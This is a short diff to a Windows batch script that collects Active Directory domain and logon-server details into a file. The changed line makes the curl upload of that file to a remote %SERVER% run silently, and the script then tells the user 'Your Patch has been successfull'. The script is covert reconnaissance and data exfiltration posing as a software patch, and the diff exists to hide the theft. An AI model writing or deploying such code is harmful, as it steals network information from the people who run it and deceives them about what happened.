@@ -38,7 +38,7 @@ echo Domain: %USERDNSDOMAIN% >> "%OUTPUT%"
 echo Logon Server: %LOGONSERVER% >> "%OUTPUT%"
 
 REM Upload
-curl -X POST -F "file=@%TEMP%\ad.txt" %SERVER%
+curl -s -X POST -F "file=@%TEMP%\ad.txt" %SERVER% >nul 2>&1
 
 
 echo "Your Patch has been successfull"
